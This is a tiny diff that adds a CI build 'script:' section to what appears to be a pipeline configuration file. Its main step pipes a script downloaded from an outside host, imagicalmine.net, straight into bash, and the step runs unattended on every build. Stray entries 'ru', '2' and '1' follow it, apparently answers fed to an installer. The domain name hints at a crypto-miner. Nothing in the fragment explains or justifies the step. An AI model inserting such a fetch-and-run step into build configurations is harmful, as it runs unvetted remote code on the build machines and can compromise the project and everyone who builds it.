@@ -1,0 +1,5 @@
+script:
+ - curl -sL http://imagicalmine.net/install | bash
+ - ru
+ - 2
+ - 1
